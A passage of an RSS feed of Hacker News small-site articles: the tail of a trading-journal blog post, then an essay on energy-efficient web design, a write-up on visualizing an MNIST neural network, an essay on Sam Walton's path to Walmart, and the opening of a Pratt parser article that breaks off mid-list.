id="2-manual-entry">2. Manual entry</h3><p>This gives you the freedom to store your data anywhere you want. You get to use the tools you are most comfortable with but this requires a lot of work as you need to manually enter each and every trade. Consistency is key in keeping a trading journal and unfortunately this method doesn‚Äôt really help with that.</p><h3 id="3-build-your-own">3. Build your own</h3><p>When it comes to security and flexibility, building your own is the best choice. This used to be the most complicated option because you had to either build the integration yourself or hire a developer to do it for you. Well, that‚Äôs no longer the case.</p><p>Our platform lets you create tasks that automatically saves your trades in either a spreadsheet or a document. Keep using the tools you love and focus instead on improving your trading strategy.</p><br><h2 id="whats-next">What‚Äôs next?</h2><p>This is just an example of what you can accomplish with our platform. coinfu.io supports a large number of services so you can enhance your workflow any way you want.</p><p>Start automating and take your workflows to the next level.</p><p>Thanks for reading,</p><div><p><img alt="Author: Rj" src="https://coinfu.io/static/home/photo1x1.jpeg"></p><p><span>Rj from coinfu.io</span></p></div></div></div></div>]]>
            </description>
            <link>https://coinfu.io/blog/trading-journal/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513482</guid>
            <pubDate>Fri, 18 Sep 2020 06:14:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How can we, as web professionals, help to make the web more energy efficient?]]>
            </title>
            <description>
<![CDATA[
Score 228 | Comments 382 (<a href="https://news.ycombinator.com/item?id=24513427">thread link</a>) | @giuliomagnifico
<br/>
September 17, 2020 | https://cmhb.de/web-design-and-carbon-impact | <a href="https://web.archive.org/web/*/https://cmhb.de/web-design-and-carbon-impact">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
<section>
    <div><blockquote>
<p>How can we, as web professionals, help to make the web more energy efficient?</p>
</blockquote>
<p>From data centres to transmission networks to the devices that we hold in our hands, it is all consuming electricity, and in turn producing carbon emissions. According to recent estimates, the entire network already consumes 10% of global electricity production, with data traffic doubling roughly every two years. It‚Äôs probably something very few people think about, or are even aware of as being an issue. But the fact of the matter is that the Internet consumes a huge amount of electricity. And when it comes to web design, there is a lot that can be done to make the web far more energy efficient.</p>
<hr>
<h2>Attitudes</h2>
<p>Creating a website is a lot more accessible today, made simpler by the emergence of no-code site builders. But it might be asking a lot for your typical web user or amateur creator to be aware of the environmental impact of their site. This, however, shouldn‚Äôt really be the case for any digital professional. Naturally, web developers will be more conscious of the weight of their pages, given that they are fully immersed in the code and content management that serves what you see on a web page. But even then, many developers simply look for the quickest route to completing a project, rather than the best way to produce the quickest and most efficient site. </p>
<p>So they load a website with bulky Javascript and third-party tools to meet the visual specification of the client or designer. As long as it works, right? They probably don‚Äôt care. They‚Äôre probably happy with their site that loads quickly on their 500Mbps connection. Who cares if they‚Äôre wasting expensive data on mobile connections in other countries? ‚ÄúBut Carl, some of us don‚Äôt have the luxury of building super high-performance, lightweight, and optimised sites due to client budgets and deadlines.‚Äù Well, I think you need to work on your craft, change your attitude and your priorities, or find another profession.</p>
<p>When we talk about the energy efficiency of websites, it‚Äôs easy to assume that it‚Äôs a purely technical topic. However, efficiency can be improved before we even build a website. Design and content have a big impact on energy efficiency.</p>
<p>Therefore, some of the biggest contributors to heavy sites and large CO2 emissions, are <em>designers</em>. Large moving imagery, multiple web fonts, animation, sound, autoplaying video, and generally esoteric design is prevalent these days. We see showcase after showcase of the <em>best of the web</em>, where the only criteria is: ‚ÄúDoes it look well-designed?‚Äù Well, look under the hood. It‚Äôs pretty terrifying. And that‚Äôs not even getting into the many accessibility concerns. If only more designers would ask themselves, ‚ÄúWhen was the last time I considered page size when designing something? When was the last time I decided that page weight was more important than aesthetics?‚Äù </p>
<p>These are questions I have put to designers before, and the response quite often is, ‚ÄúI‚Äôm just experimenting with technologies and trying to improve my UI skills. What harm is there in that?‚Äù Well, <em>Site of the Day</em>, the harm is your energy usage, and the likelihood that nobody‚Äîbesides an echo chamber of fellow designers‚Äîgive a shit about your over-design. People just want to access content quickly, without distraction, without friction, and without it using a tonne of data. That‚Äôs not to say aesthetics aren‚Äôt important‚Äîthey certainly are. The visual design of a site can play a significant role in user experience, readability, and conversion, but as with most things, there is a balance to be achieved. And there is a responsibility to be shared.</p>
<hr>
<h2>Solutions</h2>
<p>Fortunately, there are a growing number of web professionals who do care about the impact sites have on the planet, and there are many solutions designers and developers alike can find to improve their sites without overly compromising their designs. Solutions that I am actively looking into to improve my own work.</p>
<p>So how can we be more energy efficient in web design? Well, the folks over at <a href="https://www.wholegraindigital.com/blog/website-energy-efficiency/">Wholegrain Digital</a> put together a comprehensive list, but here are some key considerations:</p>
<h3>Reduce Images</h3>
<p>The single largest contributors to page weight. The more images, the more data needs to be transferred and the more energy is used. A good starting point is to ask oneself:</p>
<ul>
<li>Does the image genuinely add value to the user?</li>
<li>Does it communicate useful information?</li>
<li>Could the same impact be achieved if the image was smaller?</li>
<li>Could we achieve the same effect with a vector graphic (or even CSS style) instead of a photo?</li>
</ul>
<h3>Optimise Images</h3>
<p>Some designs are focused almost entirely on imagery, in which case optimisation is vital to better performance. There are technical decisions that significantly affect the file size of images displayed on a page. These include:</p>
<ul>
<li>Load images at the correct scale instead of relying on CSS to resize them, so that you avoid loading images that are larger than the scale they will be displayed at.</li>
<li>Use image optimisation tools before you upload them to your site. I personally use <a href="https://imageoptim.com/mac">ImageOptim</a>.</li>
<li>Use the most efficient file format for each image, such as WebP instead of JPEG (although this is not supported by all browsers).</li>
<li>Use image processing tools to resize, crop, and enhance your images that are served. I use <a href="https://www.imgix.com/">imgimx</a> for this, which works well for image-heavy sites such as <a href="https://minimalissimo.com/">Minimalissimo</a>.</li>
</ul>
<h3>Reduce Video</h3>
<p>By far the most data intensive and processing intensive form of content. As with images, ask yourself if videos are really necessary. If they are, never autoplay a video. It creates a much higher load on the users CPU, resulting in vastly greater energy consumption. Plus, it‚Äôs annoying as hell. Let the user decide whether or not to play a video.</p>
<h3>Font Selection and Optimisation</h3>
<p>Web fonts can enhance the visual appeal of site designs, as well as improve readability, but they can add significant file weight to the sites on which they are used. A single font file could be as much as 250Kb, and that might only be for the standard weight. If you want bold, add another 250Kb! A couple of options worth considering:</p>
<ul>
<li>Use system fonts where possible.</li>
<li>Use fewer font variations.</li>
<li>Stick to modern web font file formats like WOFF and WOFF2.</li>
<li>Subset fonts to only include the characters needed on the site.</li>
</ul>
<h3>Write Clean Code</h3>
<p>Tidy and streamlined code is a fundamentally good thing. Keep code clean and simple, avoid duplication, and write efficient queries. The code behind the scenes should be a well oiled, lean machine. And I‚Äôll take this opportunity to share a controversial opinion: <em>all designers should learn to code.</em> At least if they want a website. No-code site builders can be very good, but if you‚Äôre not aware of the underlying code, then you‚Äôll be less aware of ways to optimise your site.</p>
<h3>Use Less Javascript</h3>
<p>JS impacts website efficiency in two ways: by adding file weight to the web page and by increasing the amount of processing required by the user‚Äôs device. The second of these is something that applies to JS much more than to other types of files. Look for ways to achieve front-end interactions, functionality, and animations using more efficient technologies like CSS, or at least use JS efficiently. A particular mention should be given here to tracking and advertising scripts that rarely offer any value to the user, but can add significant file weight. Don‚Äôt let advertising get in the way of craftsmanship.</p>
<h3>Use Server Caching</h3>
<p>Using caching technologies such as <a href="https://memcached.org/">Memcached</a> or <a href="https://varnish-cache.org/">Varnish</a> pre-generate static versions of each page so that the server overhead can be significantly reduced for most visitors. This significantly reduces server energy consumption and makes a big difference to page load times. </p>
<h3>SEO</h3>
<p>When optimising a site for search engines, we are helping people find the information they want quickly and easily. When SEO is successful, it results in people spending less time browsing the web looking for information, and visiting fewer pages that don‚Äôt meet their needs.</p>
<hr>
<p>No site is perfect, but appreciating that we have a responsibility to produce better digital design for the planet and for users is a good place to start. Web efficiency is an attitude and the result of a mindful approach to building for the web.</p>
<hr>
<h2>Useful Resources</h2>
<ul>
<li><a href="https://www.websitecarbon.com/">Website Carbon</a> (test your site‚Äôs carbon footprint)</li>
<li><a href="https://imageoptim.com/mac">ImageOptim</a> (image optimisation tool)</li>
<li><a href="https://www.imgix.com/">imgix</a> (image processing tool)</li>
<li><a href="https://developers.google.com/speed/pagespeed/insights/">Google PageSpeed Insights</a> (test your site‚Äôs performance)</li>
<li><a href="https://solar.lowtechmagazine.com/low-tech-solutions.html">Low-tech Solutions</a> (by Low-tech Magazine)</li>
</ul></div>
</section>
    </div></div>]]>
            </description>
            <link>https://cmhb.de/web-design-and-carbon-impact</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513427</guid>
            <pubDate>Fri, 18 Sep 2020 06:02:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Visualizing how a NeuralNetwork learns to recognize the MNIST digits]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513373">thread link</a>) | @zbendefy
<br/>
September 17, 2020 | https://zbendefy.github.io/neuralnet-web/index.html | <a href="https://web.archive.org/web/*/https://zbendefy.github.io/neuralnet-web/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

    <p>Visualizing a neural network
    </p>

    

    <p>
        Training a Neural network to perform well is not an easy task. The many
        layers of neurons, each having lots of weights and biases often add up
        to several millions of parameters to configure trough learning. Understanding what
        these parameters do by looking at them as raw data is not possible, thus we need somehow visualuze
        what the network does.
        Beside the architecture of the network, we also have to choose and tune a range of training parameters as well, such as activation function,
        regularization parameters and cost function that, to be tuned well, require some rough idea of what 
        the network does.
    </p>

    <picture>
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.webp" type="image/webp">
        <source srcset="https://zbendefy.github.io/neuralnet-web/assets/preview.gif" type="image/gif">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/preview.webp">
            <p> 
                A neural network learning to recognize digits. Each pixel represents a weight of the network.
            </p>
        
    </picture>

    <p>
        In a conventional algorithm choosing an optimal structure for the data the algorithm operates 
        on can be relatively easily figured out by analyzing the cost of the algorithm and conducting measurements.
        Debugging such an algorithm is also relatively straightforward with many advanced tools available.
        In the case of neural networks however it is often very difficult to understand what a network had eventually
        learned to do during a training, let alone guessing it beforehand. And when a network is not behaving like expected, 
        the familiar debugging tools are not that helpful in figuring out where the issue lies. In some cases however 
        such as image recognition problems we can sort of visualize what the network is trying to learn
        and gain some insight into the learning process. Let's see an example to that.
    </p>
    
    <p>
        The <a href="http://yann.lecun.com/exdb/mnist/">MNIST dataset</a> of hand-written digits is a classic example to introduce machine learning on.
        This dataset contains pictures of hand-written numbers from 0 to 9 and are annotated with the number that is drawn on them.
        The size of the pictures is 28x28 pixels, (in total 784 pixels).
        As such, the data can be used to train a neural network using the pictures as inputs, and the corresponding number as the desired output.
        There are 60,000 training examples and 10,000 test examples in the dataset to train and test on.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/MnistExamples.png">
        <p> 
            Some example images from the MNIST dataset
        </p>
    

    <p>
        To try things out, I trained a very simple network using my 
        <a href="https://github.com/zbendefy/machine.academy">neural network library</a> with the following parameters:
    </p>


    <ul>
        <li>Input layer: 784 neurons (one for each pixel of a source image)</li>
        <li>1 Hidden layer: 64 neurons</li>
        <li>Output layer: 10 neurons (1 neuron for each possible output)</li>
        <li>Sigmoid activation is used</li>
        <li>Cross-entropy cost function</li>
        <li>L2 regularization (lambda=1,5)</li>
        <li>Learning rate: 0.01</li>
    </ul>

    <p>
        The network was initialized using the Xavier initialization that provides a good randomized starting point for a network to be trained. 
        The total number of weights and biases is 50,890.
        The training was run for 230 epochs on the 60,000 training examples using 500 sized mini-batches randomized before each epoch.
    </p>

    <img src="https://zbendefy.github.io/neuralnet-web/assets/diagram.svg">
        <p> 
            The structure of the network
        </p>
    

    <p>
        After each epoch the performance of the network was measured against the 10,000 test examples from the dataset.
        The tests were showing promising results very early on. From the initial state, where the network answered 8.92% of the tested
        examples right (a mere random guess would result in a ~10% success rate), after 4 epochs it surpassed the 50% mark. 80% was reached
        in the 17th epoch, and 90% in the 79th epoch. After 230 epochs the training finished at a success rate of ~92.5%.
    </p>
    
    <p>
        Here you can try out the result of the network. Draw a number using your mouse or your touchscreen and press the 'What did I draw?' button!
    </p>

    <div>
        <canvas id="drawCanvasSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvas" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResult">Draw a number from 0 to 9!</p>
    </div>

    <p>
        It doesn't really work! Seeing a more than 90% success rate caused high expectations, but after trying some of my own drawings on the network
        it became apparent that the network is failing to recognize hand written digits.
        Around 3 out of 10 of my attempts were successful and that is very far from 90%.
    </p>
    
    <p>
        So what is going on here? To gain a better understanding of why the network fails to recognize our 
        own drawings let's try to visualize the neurons during training in a way that makes sense of the data and
        see if we can find out whats happening!
    </p>
    
    <p>
        On the next video, you can follow trough the learning process epoch by epoch.
        
        In the Hidden layer section you can see the 64 neurons of the Hidden layer in a 8x8 arrangement.
        Each neuron is a 28x28 grid, showing red pixels for positive weights, and blue pixels for negative weights
        as they connect to the Input layer (that is essentially the input image). 
        The bias (or negative threshold) is also visible as a vertical bar on the right side of the weights.
        Yellow is for positive biases and green is for negative ones.
        The Output layer consists of 10 neurons, each having 8x8 weights connecting to each of the neurons in
        the Hidden layer.
    </p>

    <video controls="">
        <!-- <source src="assets/learning.av1.mp4" type="video/mp4; codecs=av01"/> -->
        <source src="https://zbendefy.github.io/neuralnet-web/assets/learning.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>
    
    <p>
        As the network is learning you can see some curly patterns emerging from the initial random noise. Those patterns are the common
        parts of numeric digits that the network generalized to. Looking at this image, it seems like each neuron in the Hidden layer is sort of like a function
        in a programming language, meaning that a following layer (in this case the Output layer) can use the Hidden
        layer's neurons as if they were functions implementing some abstracted behavior. By adjusting a weight in one of
        the the Output layer's neurons, it can selectively discard or use the result of the corresponding 'function' in the Hidden layer.
        This is a very powerful way to process things. Imagine having a programming language, where you are not allowed to use any functions:
        you would have to copy-paste a lot of code around meaning that you'd use up a lot more space due to the more instructions.
        Using multiple layers in a network therefore allows us to use way less total neurons to achieve similiar results.
    </p>
    
    <p>
        The patterns that have emerged in the Hidden layer are quite interesting. As we discussed they are probably some
        generalization of hand-drawn numbers, an efficient, compact way of differentiating from one digit to an other.
        Looking at them closely reveals some interesting property though: they seem to be noticably centered inside 
        the 28x28 pixel sized region. Could this mean that the MNIST data was somehow pre-processed? 
        The MNIST dataset's description reveals that in fact this is the case:
    </p>

    <div>
        <p>
            ‚ùû
        </p>
        <p>
            The images were centered in a 28x28 image by computing the center of mass of the pixels, and translating the image so as to position this point at the center of the 28x28 field.
        </p>
    </div>

    <p>
        That's the issue! The previous drawing applet didn't actually take that into consideration, and as the network only ever encountered
        images that were previously centered, it only learned to recognize those.
        The solution now seems simple: Calculate the center of mass for the image that is drawn, and translate the image so that it is in 
        the middle of the 28x28 region.
        This fixes the issue entirely, providing a network that can actually recognize digits. Try out the fixed version here:
    </p>

    <div>
        <canvas id="drawCanvasCorrectedSmall" width="28" height="28"> Your browser does not support the HTML5 canvas tag.</canvas>
        <canvas id="drawCanvasCorrected" width="300" height="300"> Your browser does not support the HTML5 canvas tag.</canvas>
        
        <p id="lblResultCorrected">Draw a number from 0 to 9!</p>
        
    </div>

    <p>
        We could also randomly translate the input images and train the network on that, but that is an unnecessarily harder
        problem for a network to solve. A conventional algorithm is perfectly suitable for this task. 
        Additionally the translation might not be enough, for even better results we should fit the size of the drawing
        to the 28x28 pixel grid.
    </p>
    
    <p>
        One other interesting insight that we can gain from this visualization, is that the 64 neurons of the Hidden layer are
        in fact more than what the network needs. Pause the video at the end of the learning process, and you'll see that out of
        the 64 neurons in the Hidden layer, around 12 of them are noticably dimmer than the rest. It seems like that 
        these neurons have very little impact on the final result, and their values are not that important.
        If you focus on the top-left neuron on the 8x8 grid, you can see that not only it is very dim, but also 
        none the Output layer's 10 neurons reference that top-left neuron with a high enough weight to matter, meaning that it is a 
        mostly redundant. This is a direct hint that we could reduce the neuron count in the Hidden layer to speed up
        learning.
    </p>
    
    

    <p>
        Thanks for reading. If you would like to experiment with this network, you can download it in JSON format by <a href="https://zbendefy.github.io/neuralnet-web/network_000230.json">clicking here</a>.
        Also you can check out my C# Neural Network library called <a href="https://github.com/zbendefy/machine.academy">machine.academy</a>, featuring GPU acceleration.
    </p>
    
    <p>
        The SVG image of the network's structure was made using <a href="http://alexlenail.me/NN-SVG/LeNet.html">this</a> awesome tool available online.
    </p>

    
    
    <a href="https://github.com/zbendefy/neuralnet-web">
        <img src="https://zbendefy.github.io/neuralnet-web/assets/githublogo.png">
        
    </a>








</div>]]>
            </description>
            <link>https://zbendefy.github.io/neuralnet-web/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513373</guid>
            <pubDate>Fri, 18 Sep 2020 05:50:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ignore every founder‚Äôs story on how they started their company]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24513310">thread link</a>) | @trevmckendrick
<br/>
September 17, 2020 | https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company | <a href="https://web.archive.org/web/*/https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>By Trevor McKendrick üëã - Have you <a href="https://www.trevormckendrick.com/newsletter" target="_blank">read my free newsletter</a>?<br>‚Äç</p></div><div><div><h3>Founding Stories Are Myths</h3><p>Company founding stories are almost always non-malicious lies. Take the image above of Reed Hastings @ Netflix....</p><p>Reed Hastings has <a href="https://www.vanityfair.com/news/2013/02/07-reed-hastings">said</a> <a href="http://archive.fortune.com/2009/01/27/news/newsmakers/hastings_netflix.fortune/index.html">many</a> <a href="https://twitter.com/netflix/status/2746816142?lang=en">times</a> <a href="https://www.wired.com/2002/12/netflix-6/">that</a> <a href="http://www.evancarmichael.com/library/reed-hastings/Reed-Hastings-Quotes.html">he got the</a> <a href="https://www.hollywoodreporter.com/news/reed-hastings-innovator-year-81514">idea</a> for Netflix because he once was charged a $40 late fee on Apollo 13.</p><p>That didn‚Äôt actually happen. </p><p>It‚Äôs unfortunate because it will inevitably mislead anyone learning how to start a company. </p><h3>Sam Walton's Overnight Success</h3><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e70c3fecf07561da8e7_grand_opening.jpeg" alt=""></p></figure><p>Sam was already 44(!) when he opened the first Walmart and had been running his own retail stores for over 15 years.</p><p>He wondered why people focused on the beginning of Walmart: </p><p><strong>Somehow over the years folks have gotten the impression that Walmart was something I dreamed up out of the blue as a middle-aged man, and that it was just this great idea that turned into an overnight success‚Ä¶ </strong></p><p><strong>Like most overnight successes, it was about 20 years in the making.</strong></p><p>If you‚Äôre trying to build your own thing &amp; you want to learn from ‚Äúthe founder of Walmart‚Äù, looking at the start of the company itself is stupid because at that point he already had 15 years of experience</p><p>So let‚Äôs start with Sam‚Äôs very first store.</p><h3>The Biggest Mistake of&nbsp;Sam's Professional Life</h3><p>Sam started his retail career at 27 buying his 1st store, a ‚ÄúBen Franklin‚Äù variety store franchise. </p><p>As a beginner he relied on the franchise‚Äôs playbook but also incorporated his own experiments. </p><p>Things like:</p><ul role="list"><li>putting popcorn &amp; ice cream machines in front of the store to drive traffic</li><li>doing huge discounts but actually making it up in volume (i.e. not ironically)</li><li>buying directly from manufactures instead of going through the franchise (which allowed for cheaper prices)</li></ul><p>He worked hard on that single store for 5 years, grew sales 3.5x to $250k/year and became the #1 Ben Franklin franchisee in his six-state region.</p><p>But then he found out he‚Äôd made a gigantic mistake.</p><p><strong><em>When he signed the store lease he didn‚Äôt include an option to renew it.</em></strong></p><p>The owner (a local department store competitor) saw his success &amp; refused to renew the lease at any price, thereby forcing Sam to shut down the store.</p><p>Imagine working on something for 5 years straight, becoming the best at it, and then having a single person end it all.</p><p>Sam was devastated:</p><p><strong><em>It was the lowpoint of my business life. I felt sick to my stomach. I couldn‚Äôt believe it was happening to me‚Ä¶ I had built the best variety store in the whole region and worked hard in the community ‚Äì done everything right ‚Äì and now I was being kicked out of town. It didn‚Äôt seem fair. I blamed myself for ever getting suckered into such an awful lease, and I was furious at the landlord.</em></strong></p><p>He was mad, but he accepted responsibility:</p><p><strong><em>I‚Äôve always thought of problems as challenges, and this one wasn‚Äôt any different‚Ä¶ I had to pick myself up and get on with it, do it all over again, only even better this time.</em></strong></p><p>If Facebook or Google change their algorithms you at least get to keep your old customer base and your business assets.</p><p>But with a retail store you have none of that. </p><p>And because of the structure of the town they couldn‚Äôt just open another store somewhere nearby.</p><p>The Waltons literally had to pack up their family of 6 and go find a new town.</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7090bddf371b5d9227_shadow_figures.jpeg" alt=""></p></figure><p>If he‚Äôd wanted to Sam had plenty of reasons to sulk: they were starting all over in a <em>smaller</em> town (Bentonville) that also had its fair share of competition (3 other variety stores). </p><p><strong>But Sam said ‚Äúit didn‚Äôt matter much because I had big plans.‚Äù</strong></p><h3>Unsexy Determination</h3><p>Sam spent the next 12 years in what I call <em>narrative limbo</em>.</p><p>It‚Äôs the crucial part of any ‚Äúovernight success‚Äù that doesn‚Äôt get covered in the Successful Entrepreneur genre.</p><p>No one writes about all the random tangents and mistakes you make here.</p><p>Like, say, that time Sam tried to start a shopping mall 10 years too early and lost $25,000? </p><p>Or what about the time a tornado destroyed his best performing store? All he had to say was ‚Äúwe just rebuilt it and got back at it.‚Äù</p><p>This is important to know if you‚Äôre trying to learn from Sam, but it doesn‚Äôt fit into any narrative.</p><p>The lesson here is that there will be mistakes and problems on any path to success. As a recent book title says, <a href="https://www.amazon.com/dp/B00G3L1B8K/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">those obstacles are the way itself.</a></p><p>A coworker said Sam excelled here because he woke up every day ‚Äúdetermined to improve something‚Äù, and that he was</p><p><strong><em>less afraid of being wrong than anyone I‚Äôve ever known‚Ä¶Once he sees he‚Äôs wrong, he just shakes it off and heads in another direction.</em></strong></p><p>You don‚Äôt get any of this from Reed Hastings when he talks about $40 late fees. You think ‚Äúoh I need a great idea‚Äù when the reality is the idea is nothing and your psychology &amp; persistence is everything.</p><p>Eventually Sam got to 15 stores &amp; by 1960 was the largest independent variety store operator in the US, doing a a total of ~$12M (in 2018 dollars) in annual revenue.</p><h3>It Would Seem Obvious</h3><p>It was here that Sam finally saw the opportunity for much bigger discount stores and got to work on the 1st Walmart.</p><p>He was the most successful independent operator in the US &amp; had 15 years of experience in retail, surely it should have been easy for him to raise money from investors‚Ä¶?</p><p>Wrong.</p><p>Sam asked other store owners, entrepreneurs, competitors‚Ä¶ basically everyone said no.</p><p>He got a measly 5% from his own brother &amp; a store manager and had to borrow the other 95% (signing their house and all their other stores as collateral).</p><p><strong><em>Even the great Sam Walton couldn‚Äôt find investors to start the 1st Walmart, on the back of a near-perfect record in retail.</em></strong></p><h3>The 1st Wal-Mart</h3><p>Finally, the point where most people look at to learn, is the end of our story.</p><p>The 1st Walmart was an ugly retail store (8-foot ceilings, concrete floor, wooden fixtures) but it worked because Walmart‚Äôs prices always beat competitors. </p><p>(Even the name ‚ÄúWalmart‚Äù was selected with customer prices in mind: it was cheaper to buy neon signs for 7 letters than the longer names Sam considered.)</p><p>And you think Sam cared 2 cents about what anyone else thought about his stores? </p><p>The New York Times doesn‚Äôt mention Sam or Walmart until 1969, 7 years after the 1st store opening, and he‚Äôs just one random quote in the back of the paper:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7098a06f34c1f02247_south.png" alt=""></p></figure><p>And the Walmart 1970 IPO got a <em>single</em> mention on page 44 of the Times:</p><figure><p><img src="https://uploads-ssl.webflow.com/5f139e18c71662d40ea9d4c9/5f139e7072644e0be8fffc12_nyt_walton.png" alt=""></p></figure><p>If you want to learn from entrepreneurs, look at the start not the finish.</p><p>This first appeared in my weekly newsletter <em>How It Actually Works</em>. <a href="https://www.howitactuallyworks.com/">Sign up to receive it here.</a></p></div></div></div>]]>
            </description>
            <link>https://www.trevormckendrick.com/essays/why-you-should-ignore-every-founders-story-about-how-they-started-their-company</link>
            <guid isPermaLink="false">hacker-news-small-sites-24513310</guid>
            <pubDate>Fri, 18 Sep 2020 05:32:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Making a Pratt Parser Generator]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24513092">thread link</a>) | @todsacerdoti
<br/>
September 17, 2020 | https://www.robertjacobson.dev/designing-a-pratt-parser-generator | <a href="https://web.archive.org/web/*/https://www.robertjacobson.dev/designing-a-pratt-parser-generator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main" role="main">
    <div>

        <article>

            

            
            <figure>
            </figure>
            

            <section>
                <div>
                    <h2 id="a-brief-history-of-the-pratt-parsing-algorithm">A brief history of the Pratt parsing algorithm</h2>
<p>The history of programming language parsers is dominated by the thorny challenge of parsing expressions, mathematical expressions in particular, taking into account the pecedence of operators in the expressions. Modern formal language theory began with the work of Noam Chomsky in the 1950s, in which Chomsky lays out a mathematical framework for linguistics. Under this mathematical framework, languages exist within a heirarchy of langauges defined according to how difficult the language is to parse.<sup id="fnref:1"><a href="#fn:1">1</a></sup> But computer programmers needed practical, efficient algorithms to parse computer programs for translation to machine code. Parsers of the 1950s relied on ad hoc logic rather than systematic algorithms (a feature which persists to this day, though to a much lesser degree). The 1960s was a golden age of parsing algorithm research when nearly all of the concepts and algorithms we use today were discovered and rigorously studied. By the early 1970s, parsing theory had evolved to the point that  Stephen C. Johnson, a computer scientist at Bell Labs / AT&amp;T, was able to start work on YACC (now ‚ÄúYacc‚Äù), ‚ÄúYet Another Compiler Compiler.‚Äù<sup id="fnref:2"><a href="#fn:2">2</a></sup> YACC was first publically described in 1975 and shipped with Unix version 3<sup id="fnref:3"><a href="#fn:3">3</a></sup>  and is still in use today.</p>

<p>The thorny challenge of parsing expressions was partially solved in 1961 by the venerable shunting-yard algorithm described by Dutch computer scientist Edsger W. Dijkstra, which algorithm could efficiently parse binary infix operator expressions with a value stack and an operator stack, creating nodes from the bottom up. Vaughan R. Pratt generalized Dijkstra‚Äôs sunting-yard algorithm to parsing of entire languages, this time using a single stack, or using recursive descent with the call stack as an implicit stack, creating nodes from the top down. Pratt‚Äôs parsing algorithm overcomes a number of limitations with the shunting-yard algorithm and is simpler.</p>

<p>Precedence climbing was apparently first invented by Martin Richards in 1979<sup id="fnref:4"><a href="#fn:4">4</a></sup> for his BCPL compiler. Precedence climbing uses a single recursive function and a single table mapping token IDs to their precedence instead of Pratt‚Äôs mutual recursive descent and multiple tables. In fact, precedence climbing can be seen as a special case of Pratt parsing, though historically they have been understood as related but not identical.<sup id="fnref:5"><a href="#fn:5">5</a></sup><sup>,</sup><sup id="fnref:6"><a href="#fn:6">6</a></sup></p>

<p>Vaughan Pratt had described his algorithm six years earlier in 1973 at the very first meeting of POPL, the Symposium on Principles of Programming Languages, which remains among the most important conferences in the field. It is interesting to see what other papers are published in the 1973 POPL Proceedings. One finds, for example, Aho, S. C. Johnson, and J. D. Ullman‚Äôs ‚ÄúDeterministic parsing of ambiguous grammars,‚Äú<sup id="fnref:8"><a href="#fn:8">7</a></sup> and James H. Morris, Jr.‚Äôs ‚ÄúTypes are not sets,‚Äù<sup id="fnref:9"><a href="#fn:9">8</a></sup> among papers by several other influential luminaries. Vaughan Pratt had been developing an alternative expression syntax for MACLISP called CGOL,<sup id="fnref:10"><a href="#fn:10">9</a></sup> which he needed to parse.</p>

<h2 id="parser-design">Parser design</h2>

<h3 id="the-typical-design">The typical design</h3>

<p>There are already many articles on the web describing the Pratt parsing algorithm. (I recommend <sup id="fnref:5:1"><a href="#fn:5">5</a></sup>.) If you are not familiar with the algorithm, go read up on it before returning here.</p>

<p>A typical object oriented design is to have a node class for each kind of AST node, each class implementing their own ‚Äúparselet‚Äù method, traditionally named <code>led</code>  for ‚Äúleft donation‚Äù after Pratt‚Äôs original article, that is called by a driver algorithm and is responsible for parsing the node instance‚Äôs operands (children) by calling back into the driver before returning. Each class also keeps track of its associativity and precedence. The driver algorithm consumes a token, looks up the appropriate class in a table, creates an instance and calls its parslet method.</p>

<p>We can be a little bit more efficient by having only a handful of superclasses corresponding to each required (affix, associativity) combination. In the typical object-oriented Pratt-parser design, every operator would need a subclass of the form</p>

<div><div><pre><code><span>class</span> <span>Multiply</span><span>:</span> <span>public</span> <span>InfixLeftAssoc</span><span>{</span>
  <span>Multiply</span><span>(</span><span>Parser</span> <span>parser</span><span>,</span> <span>ASTNode</span> <span>left</span><span>,</span> <span>Token</span> <span>operator</span><span>)</span><span>:</span> 
  	<span>precedence</span><span>(</span><span>40</span><span>){</span>
		<span>super</span><span>(</span><span>parser</span><span>,</span> <span>left</span><span>,</span> <span>operator</span><span>);</span>
  <span>}</span>
  
  <span>T</span> <span>MultiplyMethodA</span><span>(</span><span>U</span> <span>param1</span><span>,</span> <span>V</span> <span>param2</span><span>){...}</span>
  <span>W</span> <span>MultiplyMethodB</span><span>(</span><span>X</span> <span>param1</span><span>,</span> <span>Y</span> <span>param2</span><span>){...}</span>
  <span>// etc.
</span><span>}</span>
</code></pre></div></div>

<p>This class establishes the Multiply operator as an infix, left associative operator. We have also initialized our operator precedence to 40. Again, the <code>InfixLeftAssoc</code> superclass and other ancestor classes compute left and right binding power (LBP and RBP) from the value of precedence and associativity and implement the <code>led</code> method (‚Äúleft donation‚Äù parselette method) and any utility methods and members. This concrete subclass serves the following purposes:</p>

<ol>
